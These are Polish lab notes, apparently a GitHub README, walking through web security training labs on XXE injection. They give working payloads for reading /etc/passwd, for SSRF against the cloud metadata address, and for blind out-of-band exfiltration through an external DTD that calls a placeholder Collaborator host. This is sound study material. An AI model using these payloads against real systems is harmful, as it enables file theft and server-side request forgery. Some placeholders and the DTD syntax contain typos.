XML to prosty format tekstowy służący do przechowywania i wymiany danych w uporządkowanej (tagowanej) formie.

XXE (XML External Entity) to podatność bezpieczeństwa, w której parser XML pozwala na wczytanie zewnętrznych danych (np. plików z systemu), co atakujący może wykorzystać do kradzieży informacji lub ataku.

📦 Przykład:

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
XML mówi: „hej parserze, weź dane z innego miejsca”
to „inne miejsce” to właśnie external entity

🧠 Czyli:
dla OS: /etc/passwd → wewnętrzny plik
dla XML parsera: /etc/passwd → zewnętrzne źródło danych

🔥 Najprostsza definicja (pentesterska):
External = poza XML-em, nie poza systemem

Dlatego:
file:///etc/passwd → external entity (lokalny plik)
http://127.0.0.1 → external entity (sieć)
ftp://... → też external

<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE using external entities to retrieve files</h2>

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 

 original:

 ```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```



 <img width="1200" height="602" alt="image" src="https://github.com/user-attachments/assets/1c37d999-3ef4-43ae-a413-8b89dd6524a8" />


<img width="1199" height="646" alt="image" src="https://github.com/user-attachments/assets/aa660ba5-5031-4729-8ee2-3e63c18d1d94" />




<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE to perform SSRF attacks</h2>

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 


original:

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>

```

<img width="1198" height="608" alt="image" src="https://github.com/user-attachments/assets/e3dec4a8-0e91-44fb-a2ba-90494df6f845" />


<img width="1223" height="687" alt="image" src="https://github.com/user-attachments/assets/dec80acb-67a4-467e-8457-67a1ddb34834" />
<img width="1204" height="603" alt="image" src="https://github.com/user-attachments/assets/0d452c77-0ad6-4f12-adb7-f7f73b9a36cb" />



<br><br>
<hr>
<br><br>
<h2>Lab: Blind XXE with out-of-band interaction</h2>

payload:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLAEDRATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>
```

<img width="1196" height="588" alt="image" src="https://github.com/user-attachments/assets/a4b421a1-b58a-4b5f-a40a-67276736ee93" />

<img width="1195" height="603" alt="image" src="https://github.com/user-attachments/assets/48cf2a12-8ce6-4b3d-83c1-a54ff4d4ed51" />

<img width="1191" height="612" alt="image" src="https://github.com/user-attachments/assets/f6196373-80b9-48ea-af02-580116aeeb11" />


<br><br>
<hr>
<br><br>
<h2>Lab: Blind XXE with out-of-band interaction via XML parameter entities</h2>

payload:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">%xxe; ]>
<stockCheck>
  <productId>
6
  </productId>
  <storeId>
2
  </storeId>
</stockCheck>
```


<img width="1205" height="636" alt="image" src="https://github.com/user-attachments/assets/afb8f9d5-433e-4cd1-8b61-51be84056d86" />

<img width="1202" height="658" alt="image" src="https://github.com/user-attachments/assets/75506037-121c-460e-8965-71327110cfb5" />



<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h2>

Atak polega na zmuszeniu serwera do pobrania złośliwego DTD, który odczytuje lokalne dane i wysyła je na serwer atakującego (Collaborator).

1. wysyłasz XML, który każe serwerowi pobrać zewnętrzny DTD (z exploit servera)
2. ten DTD zawiera złośliwe encje, które:
3. czytają lokalny plik (np. /etc/passwd) i wysyłają jego zawartość na Collaboratora
4. serwer parsuje XML + DTD i sam wykonuje exfiltrację danych

payload repeater:
(ppm>insert collab)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://expolit-server.net/exploit">%xxe; ]>
<stockCheck>
  <productId>
6
  </productId>
  <storeId>
2
  </storeId>
</stockCheck>
```


exploit server body:

```
<! ENTITY % file SYSTEM "file:///etc/hostname">
<! ENTITY % eval " <! ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file; '>">
%eval;
%exfil;
```


<img width="1195" height="608" alt="image" src="https://github.com/user-attachments/assets/f4446ade-0192-4496-b6a4-636c7ffc784c" />

<img width="1389" height="683" alt="image" src="https://github.com/user-attachments/assets/3c45dd23-3d66-4e02-bc8b-d355c4115473" />
<img width="1344" height="724" alt="image" src="https://github.com/user-attachments/assets/35706f62-5a87-44de-bccb-39b4a4a19dff" />


